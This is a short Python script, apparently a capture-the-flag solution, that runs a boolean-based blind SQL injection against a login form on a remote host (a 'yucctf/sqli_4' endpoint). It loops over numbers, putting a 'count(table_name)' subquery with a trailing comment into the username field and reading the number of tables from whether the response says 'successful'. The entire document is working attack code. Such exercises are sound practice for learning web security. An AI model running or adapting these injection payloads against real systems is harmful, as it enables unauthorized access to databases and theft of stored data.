import requests
dict="qazwsxedcrfvtgbyhnujmikolp123456789{}-"
url="http://mashang.eicp.vip:1650/api/yucctf/sqli_4/sql2.php"
flag=""
for i in range(1,100):
     payload = "1' or if((select count(table_name)from information_schema.tables where table_schema=database())=%s,1,0)-- "%i
     data = {"user":payload,"passwd":"1"}
     r=requests.post(url,data=data)
     if 'successful' in r.text:
         print(i)
